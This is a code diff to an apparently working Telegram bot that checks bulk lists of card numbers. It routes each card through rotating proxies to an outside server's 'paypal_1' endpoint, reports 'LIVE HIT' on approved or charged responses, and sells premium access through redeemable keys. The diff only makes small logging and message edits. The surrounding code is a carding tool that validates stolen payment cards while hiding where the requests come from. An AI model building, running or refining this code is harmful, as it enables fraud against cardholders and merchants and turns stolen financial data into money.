@@ -1,5 +1,5 @@
 from telethon import TelegramClient, events
-import re, asyncio, os, random, json
+import re, asyncio, os, random
 import aiohttp
 import aiofiles
 from datetime import datetime
@@ -72,7 +72,7 @@ async def redeem_key(user_id, key: str):
     await save_json(PREMIUM_FILE, premium)
     return f"✅ Success! Premium activated for {days} days."
 
-# ================== CHECKER WITH YOUR API ==================
+# ================== YOUR API ==================
 async def check_card(card: str):
     current_time = datetime.now().strftime('%H:%M:%S')
     print(f"[{current_time}] CHECKING → {card}")
@@ -80,15 +80,13 @@ async def check_card(card: str):
     try:
         proxy = random.choice(PROXIES)
         proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"
-        print(f"[{current_time}] PROXY → {proxy.split(':')[0]}:{proxy.split(':')[1]}")
 
         url = f"http://138.128.240.15:8024/paypal_1?cc={card}"
 
         async with aiohttp.ClientSession() as session:
             async with session.get(url, proxy=proxy_url, timeout=40) as r:
                 text = await r.text()
-                print(f"[{current_time}] STATUS: {r.status}")
-                print(f"[{current_time}] RESPONSE: {text[:400]}")
+                print(f"[{current_time}] STATUS: {r.status} | RESPONSE: {text[:300]}")
 
                 if r.status == 200 and any(x in text.lower() for x in ["approved", "success", "live", "charged"]):
                     print(f"[{current_time}] ✅ LIVE HIT!")
@@ -160,7 +158,7 @@ async def txt_handler(event):
     if not cards:
         return await event.reply("❌ No valid cards!")
 
-    await event.reply(f"✅ Found **{len(cards)}** cards. Starting check...")
+    await event.reply(f"✅ Found **{len(cards)}** cards. Starting...")
 
     for card in cards:
         result = await check_card(card)
